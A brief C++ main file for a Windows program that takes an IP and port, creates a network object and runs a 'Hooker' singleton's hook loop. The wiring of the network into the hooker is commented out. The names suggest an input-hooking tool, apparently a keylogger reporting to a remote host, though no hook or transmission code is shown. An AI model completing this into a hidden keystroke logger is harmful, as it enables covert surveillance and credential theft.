#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include "Hooker.hh"
#include "reseau/Network.hh"

int main(int ac, char **av)
{
	if (ac >= 3)
	{
		Network* network = new Network(av[2], av[1]);
		Hooker& hooker = Hooker::getInstance();
//		hooker.setNetwork(network);
		hooker.runHookLoop();
		return EXIT_SUCCESS;
	}
	std::cerr << "Usage: " << av[0] << " [ip]" << " [port]" << std::endl;
	return EXIT_FAILURE;
}
